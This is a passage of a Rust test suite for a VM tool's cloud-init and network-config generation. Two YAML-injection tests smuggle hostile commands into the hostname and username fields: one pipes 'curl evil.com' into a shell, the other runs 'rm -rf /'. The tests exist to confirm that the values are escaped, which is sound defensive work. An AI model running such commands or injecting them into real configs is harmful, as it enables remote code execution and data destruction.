        assert!(out.status.success(), "network-config should exist on disk");

        let content = fs::read_to_string(extract_dir.join("network-config")).unwrap();
        assert!(content.contains("version: 2"));
        assert!(content.contains("10.0.1.5/24"));
        assert!(content.contains("gateway4: 10.0.1.1"));
        assert!(content.contains("mtu: 1500"));
        assert!(content.contains("8.8.8.8"));
    }

    #[test]
    fn cloud_init_cleanup_no_work_dir_left() {
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            eprintln!("SKIP: mkfs.vfat/mcopy not available");
            return;
        }

        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
        let config = minimal_cloud_init_config();

        generate_cloud_init(&config, &dir, &id).unwrap();

        // Temp working directory should have been cleaned up
        assert!(!dir.path().join("cloud-init-tmp").exists());
    }

    // ========================================================================
    // 3b. YAML injection prevention (#670)
    // ========================================================================

    #[test]
    fn cloud_init_hostname_injection_is_escaped() {
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            eprintln!("SKIP: mkfs.vfat/mcopy not available");
            return;
        }

        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();

        // Malicious hostname attempting YAML injection
        let config = CloudInitConfig {
            hostname: "evil\nruncmd:\n  - curl evil.com | sh".to_string(),
            ssh_authorized_keys: vec![],
            default_user: "ubuntu".to_string(),
            users: vec![],
            network_config: None,
            user_data_extra: None,
        };

        let img_path = generate_cloud_init(&config, &dir, &id).unwrap();

        // Extract meta-data and verify the injected payload is quoted/escaped
        let extract_dir = tmp.path().join("extract");
        fs::create_dir_all(&extract_dir).unwrap();
        let out = Command::new("mcopy")
            .args([
                "-i",
                &img_path.to_string_lossy(),
                "::meta-data",
                &extract_dir.join("meta-data").to_string_lossy(),
            ])
            .output()
            .unwrap();
        assert!(out.status.success());

        let content = fs::read_to_string(extract_dir.join("meta-data")).unwrap();
        // The malicious hostname must NOT appear as a bare `runcmd:` directive.
        // serde_yaml will quote the multiline string, preventing injection.
        let parsed: serde_yaml::Mapping = serde_yaml::from_str(&content).unwrap();
        let hostname_val = parsed
            .get(YamlValue::String("local-hostname".to_string()))
            .unwrap();
        // The value must be a single scalar containing the full injected string,
        // NOT split into separate YAML keys.
        assert_eq!(
            hostname_val.as_str().unwrap(),
            "evil\nruncmd:\n  - curl evil.com | sh"
        );
    }

    #[test]
    fn cloud_init_username_injection_is_escaped() {
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            eprintln!("SKIP: mkfs.vfat/mcopy not available");
            return;
        }

        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();

        let config = CloudInitConfig {
            hostname: "safe-host".to_string(),
            ssh_authorized_keys: vec![],
            default_user: "admin\nruncmd:\n  - rm -rf /".to_string(),
            users: vec![],
            network_config: None,
            user_data_extra: None,
        };

        let img_path = generate_cloud_init(&config, &dir, &id).unwrap();

        let extract_dir = tmp.path().join("extract");
        fs::create_dir_all(&extract_dir).unwrap();
        let out = Command::new("mcopy")
            .args([
                "-i",
                &img_path.to_string_lossy(),
                "::user-data",
                &extract_dir.join("user-data").to_string_lossy(),
            ])
            .output()
            .unwrap();
        assert!(out.status.success());

        let raw = fs::read_to_string(extract_dir.join("user-data")).unwrap();
        // Strip the #cloud-config header and parse the YAML body
        let yaml_body = raw.strip_prefix("#cloud-config\n").unwrap();
        let parsed: serde_yaml::Value = serde_yaml::from_str(yaml_body).unwrap();
        let users = parsed["users"].as_sequence().unwrap();
        let name = users[0]["name"].as_str().unwrap();
        // Must be a single quoted scalar, not split into YAML keys
        assert_eq!(name, "admin\nruncmd:\n  - rm -rf /");
    }

    // ========================================================================
    // 3c. Network config v2 (#755)
    // ========================================================================

    #[test]
    fn network_config_generated() {
        let yaml = generate_network_config("10.0.1.5", 24, "10.0.1.1", 1350);
        // Must be valid YAML
        let parsed: serde_yaml::Value = serde_yaml::from_str(&yaml).unwrap();
        assert!(
            parsed["network"].is_mapping(),
            "top-level 'network' key expected"
        );
        assert_eq!(parsed["network"]["version"].as_u64(), Some(2));
    }

    #[test]
    fn correct_ip() {
        let yaml = generate_network_config("10.0.1.5", 24, "10.0.1.1", 1350);
        let parsed: serde_yaml::Value = serde_yaml::from_str(&yaml).unwrap();
        let addresses = parsed["network"]["ethernets"]["eth0"]["addresses"]
            .as_sequence()
            .unwrap();
        let addr = addresses[0].as_str().unwrap();
        assert_eq!(addr, "10.0.1.5/24");
    }

    #[test]
    fn correct_gateway() {
        let yaml = generate_network_config("10.0.1.5", 24, "10.0.1.1", 1350);
        let parsed: serde_yaml::Value = serde_yaml::from_str(&yaml).unwrap();
        let gw = parsed["network"]["ethernets"]["eth0"]["gateway4"]
            .as_str()
            .unwrap();
        assert_eq!(gw, "10.0.1.1");
    }

    #[test]
    fn mtu_1350() {
        let yaml = generate_network_config("10.0.1.5", 24, "10.0.1.1", 1350);
        let parsed: serde_yaml::Value = serde_yaml::from_str(&yaml).unwrap();
        let mtu = parsed["network"]["ethernets"]["eth0"]["mtu"]
            .as_u64()
            .unwrap();
        assert_eq!(mtu, 1350);
    }

    #[test]
    fn dns_servers() {
        let yaml = generate_network_config("10.0.1.5", 24, "10.0.1.1", 1350);
        let parsed: serde_yaml::Value = serde_yaml::from_str(&yaml).unwrap();
        let dns = parsed["network"]["ethernets"]["eth0"]["nameservers"]["addresses"]
            .as_sequence()
            .unwrap();
        let servers: Vec<&str> = dns.iter().map(|v| v.as_str().unwrap()).collect();
        assert!(servers.contains(&"8.8.8.8"));
        assert!(servers.contains(&"1.1.1.1"));
    }

    // ========================================================================
    // 4. Integration test (#551)
    // ========================================================================

    #[test]
    fn integration_create_clone_cloud_init_cleanup() {
        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();

        // 1. Create instance dir
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
        assert!(dir.exists());

        // 2. Clone a base image
        let base = tmp.path().join("base.raw");
        fs::write(&base, vec![0xABu8; 1024 * 512]).unwrap();
        let effective = clone_image(&base, &dir, None, 1).unwrap();
        assert!(effective > 0);
        assert!(dir.rootfs_path().exists());

        // 3. Write metadata
        let meta = sample_meta();
        dir.write_metadata(&meta).unwrap();
        assert!(dir.metadata_path().exists());

        // 4. Generate cloud-init (if tools available)
        if has_tool("mkfs.vfat") && has_tool("mcopy") {
            let config = minimal_cloud_init_config();
            let ci_path = generate_cloud_init(&config, &dir, &id).unwrap();
            assert!(ci_path.exists());
            assert!(dir.cloud_init_path().exists());
        }

        // 5. Verify all files present
        assert!(dir.rootfs_path().exists());
        assert!(dir.metadata_path().exists());

        // 6. Cleanup and verify everything gone
        let dir_path = dir.path().to_path_buf();
        dir.cleanup().unwrap();
        assert!(!dir_path.exists());
    }

    // ========================================================================
    // 5. Combined SSH + network config-drive tests (#756)
    // ========================================================================

    #[test]
    fn combined_ssh_and_network() {
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            eprintln!("SKIP: mkfs.vfat/mcopy not available");
            return;
        }

        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
        let config = CloudInitConfig {
            hostname: "combined-vm".to_string(),
            ssh_authorized_keys: vec!["ssh-ed25519 AAAA... user@host".to_string()],
            default_user: "ubuntu".to_string(),
            users: vec![],
            network_config: Some(CloudInitNetworkConfig {
                ip: "10.0.1.5".to_string(),
                prefix_len: 24,
                gateway: "10.0.1.1".to_string(),
                mtu: 1350,
                dns: vec!["8.8.8.8".to_string(), "1.1.1.1".to_string()],
            }),
            user_data_extra: None,
        };

        let img_path = generate_cloud_init(&config, &dir, &id).unwrap();
        let extract_dir = tmp.path().join("extract");
        fs::create_dir_all(&extract_dir).unwrap();

        // Extract and verify user-data contains SSH key
        let out = Command::new("mcopy")
            .args([
                "-i",
                &img_path.to_string_lossy(),
                "::user-data",
                &extract_dir.join("user-data").to_string_lossy(),
            ])
            .output()
            .unwrap();
        assert!(out.status.success(), "user-data should exist");
        let user_data = fs::read_to_string(extract_dir.join("user-data")).unwrap();
        assert!(user_data.contains("#cloud-config"));
        assert!(user_data.contains("ssh-ed25519"));

        // Extract and verify network-config contains IP, gateway, MTU, DNS
        let out = Command::new("mcopy")
            .args([
                "-i",
                &img_path.to_string_lossy(),
                "::network-config",
                &extract_dir.join("network-config").to_string_lossy(),
            ])
            .output()
            .unwrap();
        assert!(out.status.success(), "network-config should exist");
        let net_cfg = fs::read_to_string(extract_dir.join("network-config")).unwrap();
        assert!(net_cfg.contains("10.0.1.5/24"));
        assert!(net_cfg.contains("gateway4: 10.0.1.1"));
        assert!(net_cfg.contains("mtu: 1350"));
        assert!(net_cfg.contains("8.8.8.8"));
        assert!(net_cfg.contains("1.1.1.1"));
    }

    #[test]
    fn iso_contains_both_files() {
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            eprintln!("SKIP: mkfs.vfat/mcopy not available");
            return;
        }

        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
        let config = CloudInitConfig {
            hostname: "both-files-vm".to_string(),
            ssh_authorized_keys: vec!["ssh-ed25519 AAAA... test@host".to_string()],
            default_user: "ubuntu".to_string(),
            users: vec![],
            network_config: Some(CloudInitNetworkConfig {
                ip: "10.0.2.10".to_string(),
                prefix_len: 24,
                gateway: "10.0.2.1".to_string(),
                mtu: 1350,
                dns: vec!["8.8.8.8".to_string()],
            }),
            user_data_extra: None,
        };

        let img_path = generate_cloud_init(&config, &dir, &id).unwrap();
        let extract_dir = tmp.path().join("extract");
        fs::create_dir_all(&extract_dir).unwrap();

        // Verify all 3 files exist in the image: meta-data, user-data, network-config
        for name in &["meta-data", "user-data", "network-config"] {
            let out = Command::new("mcopy")
                .args([
                    "-i",
                    &img_path.to_string_lossy(),
                    &format!("::{name}"),
                    &extract_dir.join(name).to_string_lossy(),
                ])
                .output()
                .unwrap();
            assert!(
                out.status.success(),
                "{name} should be present in the config-drive image"
            );
            let content = fs::read_to_string(extract_dir.join(name)).unwrap();
            assert!(!content.is_empty(), "{name} should be non-empty");
        }
    }
}
